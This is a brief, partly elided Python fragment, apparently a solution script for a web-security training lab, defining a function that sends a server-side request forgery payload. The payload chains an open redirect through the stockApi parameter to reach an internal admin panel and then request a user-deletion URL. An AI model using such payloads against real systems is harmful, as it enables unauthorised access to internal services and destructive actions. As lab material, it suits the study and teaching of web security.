...
def ssrf_exploit(session, url) :
    ...
    data = {'stockApi':'/product/nextProduct%3fcurrentProductId%3d1%26path%3dhttp%3a//192.168.0.12%3a8080/admin'}
    ...
    if "carlos" in res.text :
        ...
        if matches :
            ...
            if delete_url :
                ...
                data = {'stockApi':'/product/nextProduct%3fcurrentProductId%3d1%26path%3d'+delete_url}
